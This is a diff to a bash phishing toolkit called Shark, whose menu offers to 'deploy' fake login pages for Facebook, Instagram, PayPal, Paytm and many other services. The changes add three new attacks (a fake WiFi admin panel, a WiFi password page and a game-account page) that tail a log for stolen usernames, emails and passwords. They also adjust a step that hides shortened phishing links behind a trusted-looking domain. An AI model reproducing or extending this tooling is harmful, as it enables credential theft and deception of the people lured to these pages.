@@ -99,6 +99,10 @@ function os () {
 	cat /etc/os-release > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then		
                 BIN="/usr/bin"
+                srk="/usr/share/shark/phs/.s.jpg"
+                sound0="/usr/share/shark/phs/.ss.mp3"
+               #sound1="/usr/share/shark/phs/.dsp1.mp3"
+               #sound2="/usr/share/shark/phs/.dsp2.mp3"
 	        phish="/usr/share/shark/phs"
 		user_id="$(logname)"
 		if [ "${user_id}" = "root" ]; then 
@@ -112,6 +116,10 @@ function os () {
 		check_root
 	else
 		BIN="${PREFIX}/bin"
+		srk="${PREFIX}/share/shark/phs/.s.jpg"
+		sound0="${PREFIX}/share/shark/phs/.ss.mp3"
+		#sound1="${PREFIX}/share/shark/phs/.dsp1.mp3"
+		#sound2="${PREFIX}/share/shark/phs/.dsp2.mp3"
 		phish="${PREFIX}/share/shark/phs"
 		files="/sdcard"
 		shark="${PREFIX}/share/shark"
@@ -236,6 +244,24 @@ function fix_ngrok() {
 function fix_cloudshell() {
 	os;man ${shark}/cloudshell
 }
+####################
+# Starting spinner #           
+####################
+spinr() {
+        pid=$!
+        spin='\|/-'
+        i=0
+        tput civis
+        while kill -0 $pid 2>/dev/null
+	do
+                i=$(( (i+1) %4 ))
+                printf "\r${cyan1}[${spin:$i:1}]${nc} ${cyan1} Starting Shark services."
+                sleep .1
+	done
+	clear
+ printf " ${green}[✔]${nc} ${green} Done.";echo
+        tput cnorm
+}
 
 ###########
 # OPTS ARG
@@ -337,9 +363,9 @@ function url_shortner() {
 	# echo `wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${link}\&keyword=$2
         short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
         shorter=${short#https://}       
-        read -p $'\n\033[1;92mshark \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
+        read -p $'\n\033[1;92mshark \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://google.com) :\e[0m ' mask
         url_checker $mask	
-	printf "${green}shark ${white}>> ${white}Enter your key words ${yellow}: Ex. free-insta-followers\n"        
+	printf "${green}shark ${white}>> ${white}Enter your key words ${yellow}: Ex. join-club-login\n"        
 	printf "${green}shark ${white}>> ${white}Don't use space in your words\n"	
         read -p $'\e[1;92mshark \033[1;97m>> \e[1;37mEnter your words here :\e[0m ' words
         final_url=$mask-$words@$shorter
@@ -470,13 +496,18 @@ function audio_hack() {
 internet
 os
 kill_session
-
+clear
 while :
 do
-	clear
-        printf "${green}
+mpv $sound0 > /dev/null 2>&1 & spinr
+sleep 3
+jp2a -i --colors $srk	
+#mpv $sound1 > /dev/null 2>&1
+sleep 3
+clear
+printf "${green}
 
-        ██████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗
+        ██████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗  
        ██╔════╝██║  ██║██╔══██╗██╔══██╗██║ ██╔╝
        ╚█████╗ ███████║███████║██████╔╝█████═╝${white}
         ╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗
@@ -489,20 +520,20 @@ do
 
      printf "           ${green}💻 \e[1;4;5;37mSelect An Attack To Deploy\e[0m${green} 💻\n\n"
 function banner(){	
-        printf "\e[1;92m[\e[0m\e[1;37m01\e[0m\e[1;92m] \e[0m\e[1;37;44mFacebook\e[0m           \e[1;92m[\e[0m\e[1;37m12\e[0m\e[1;92m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;92m[\e[0m\e[1;37m23\e[0m\e[1;92m] \e[0m\e[1;37;44mWordpress\e[0m\n\n"
-        printf "\e[1;92m[\e[0m\e[1;37m02\e[0m\e[1;92m] \e[0m\e[1;37;41mPinterest\e[0m          \e[1;92m[\e[0m\e[1;37m13\e[0m\e[1;92m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;92m[\e[0m\e[1;37m24\e[0m\e[1;92m] \e[0m\e[1;37;43mSnapchat\e[0m\n\n" 
-        printf "\e[1;92m[\e[0m\e[1;37m03\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInstagram\e[0m          \e[1;92m[\e[0m\e[1;37m14\e[0m\e[1;92m] \e[0m\e[1;37;42mSpotify\e[0m           \e[1;92m[\e[0m\e[1;37m25\e[0m\e[1;92m] \e[0m\e[1;37;40mProtonmail\e[0m\n\n"
-        printf "\e[1;92m[\e[0m\e[1;37m04\e[0m\e[1;92m] \e[0m\e[1;37;40mUber \e[1;37;42mEats\e[0m          \e[1;92m[\e[0m\e[1;37m15\e[0m\e[1;92m] \e[0m\e[1;37;40mGithub\e[0m            \e[1;92m[\e[0m\e[1;37m26\e[0m\e[1;92m] \e[0m\e[1;38;5;209m\e[40mStackoverflow\e[0m\n\n" 
+        printf "\e[1;92m[\e[0m\e[1;37m01\e[0m\e[1;92m] \e[0m\e[1;37;44mFacebook\e[0m           \e[1;92m[\e[0m\e[1;37m12\e[0m\e[1;92m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;92m[\e[0m\e[1;37m23\e[0m\e[1;92m] \e[0m\e[1;37;44mWordpress\e[0m            \e[1;92m[\e[0m\e[1;37m33\e[0m\e[1;92m] \e[0m\e[1;37;46mwifi-adminpanel\e[0m\n\n"
+        printf "\e[1;92m[\e[0m\e[1;37m02\e[0m\e[1;92m] \e[0m\e[1;37;41mPinterest\e[0m          \e[1;92m[\e[0m\e[1;37m13\e[0m\e[1;92m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;92m[\e[0m\e[1;37m24\e[0m\e[1;92m] \e[0m\e[1;37;43mSnapchat\e[0m             \e[1;92m[\e[0m\e[1;37m34\e[0m\e[1;92m] \e[0m\e[1;48;5;4mWIFI-passwd\e[0m\n\n" 
+        printf "\e[1;92m[\e[0m\e[1;37m03\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInstagram\e[0m          \e[1;92m[\e[0m\e[1;37m14\e[0m\e[1;92m] \e[0m\e[1;37;42mSpotify\e[0m           \e[1;92m[\e[0m\e[1;37m25\e[0m\e[1;92m] \e[0m\e[1;37;40mProtonmail\e[0m           \e[1;92m[\e[0m\e[1;37m35\e[0m\e[1;92m] \e[0m\e[1;37;42mGameid hack\e[0m\n\n"
+        printf "\e[1;92m[\e[0m\e[1;37m04\e[0m\e[1;92m] \e[0m\e[1;37;40mUber \e[1;37;42mEats\e[0m          \e[1;92m[\e[0m\e[1;37m15\e[0m\e[1;92m] \e[0m\e[1;37;40mGithub\e[0m            \e[1;92m[\e[0m\e[1;37m26\e[0m\e[1;92m] \e[0m\e[1;38;5;209m\e[40mStackoverflow\e[0m        \e[1;92m[\e[0m\e[1;37m99\e[0m\e[1;92m] \e[0m\e[1;91;102mExit\e[0m\n\n" 
         printf "\e[1;92m[\e[0m\e[1;37m05\e[0m\e[1;92m] \e[0m\e[1;93;40mOLA\e[0m                \e[1;92m[\e[0m\e[1;37m16\e[0m\e[1;92m] \e[0m\e[1;37;43mIPFinder\e[0m          \e[1;92m[\e[0m\e[1;37m27\e[0m\e[1;92m] \e[0m\e[1;40m\e[91mE\e[94mb\e[93ma\e[92my\e[0m\n\n"  
         printf "\e[1;92m[\e[0m\e[1;37m06\e[0m\e[1;92m] \e[0m\e[1;40m\e[94mG\e[91mO\e[93mO\e[94mG\e[92mL\e[91mE\e[0m             \e[1;92m[\e[0m\e[1;37m17\e[0m\e[1;92m] \e[0m\e[1;37;101mZomato\e[0m            \e[1;92m[\e[0m\e[1;37m28\e[0m\e[1;92m] \e[0m\e[1;48;5;129mTwitch\e[0m\n\n"           
         printf "\e[1;92m[\e[0m\e[1;37m07\e[0m\e[1;92m] \e[0m\e[1;107m\e[30mPay\e[106mtm\e[0m              \e[1;92m[\e[0m\e[1;37m18\e[0m\e[1;92m] \e[0m\e[1;48;5;91mPhonePay\e[0m          \e[1;92m[\e[0m\e[1;37m29\e[0m\e[1;92m] \e[0m\e[1;48;5;236mAJIO\e[0m\n\n"
         printf "\e[1;92m[\e[0m\e[1;37m08\e[0m\e[1;92m] \e[0m\e[1;91;107mNetflix\e[0m            \e[1;92m[\e[0m\e[1;37m19\e[0m\e[1;92m] \e[0m\e[1;107m\e[30mPay\e[106mpal\e[0m            \e[1;92m[\e[0m\e[1;37m30\e[0m\e[1;92m] \e[0m\e[1;48;5;21mMobikwik\e[0m\n\n"   
         printf "\e[1;92m[\e[0m\e[1;37m09\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInsta-Followers\e[0m    \e[1;92m[\e[0m\e[1;37m20\e[0m\e[1;92m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;92m[\e[0m\e[1;37m31\e[0m\e[1;92m] \e[0m\e[1;48;5;89mCamera_hack\e[m\n\n"
         printf "\e[1;92m[\e[0m\e[1;37m10\e[0m\e[1;92m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;92m[\e[0m\e[1;37m21\e[0m\e[1;92m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;92m[\e[0m\e[1;37m32\e[0m\e[1;92m] \e[0m\e[1;48;5;197mAudio_hack\e[m\n\n"
-        printf "\e[1;92m[\e[0m\e[1;37m11\e[0m\e[1;92m] \e[0m\e[1;37;42mWhatsApp\e[0m           \e[1;92m[\e[0m\e[1;37m22\e[0m\e[1;92m] \e[0m\e[1;34;103mFlipcart\e[0m          \e[1;92m[\e[0m\e[1;37m99\e[0m\e[1;92m] \e[0m\e[1;91;102mExit\e[0m\n\n"
-        read -p $'\e[1;92mshark \e[1;97m>>\e[0m ' option
+        printf "\e[1;92m[\e[0m\e[1;37m11\e[0m\e[1;92m] \e[0m\e[1;37;42mWhatsApp\e[0m           \e[1;92m[\e[0m\e[1;37m22\e[0m\e[1;92m] \e[0m\e[1;34;103mFlipcart\e[0m\n\n"
+        read -p $'\e[1;92mSHARK \e[1;97m>>>\e[0m ' option
 }
-
+#mpv $sound2 > /dev/null 2>&1
 
 #######
 # MAIN
@@ -698,6 +729,25 @@ function banner(){
 		cd $phish/Audio_hack && file_check
                 audio_hack
 		break;
+	
+	elif [ $option = 33 ];then		
+                cd $phish/wiapp/ && main 
+		credentials
+                tail -f log.txt | grep -e "Username:" -e "Password:"
+                break;
+	
+	elif [ $option = 34 ];then		
+                cd $phish/wip/ && main 
+		credentials
+                tail -f log.txt | grep -e "Password:"
+                break;
+	
+	elif [ $option = 35 ];then		
+                cd $phish/gidp/ && main
+		credentials
+                tail -f log.txt | grep -e "Game:" -e "Email:" -e "Password:"
+                break;
+	
 			   
 	elif [ $option = 99 ];then		
 		printf "\n" && exit 
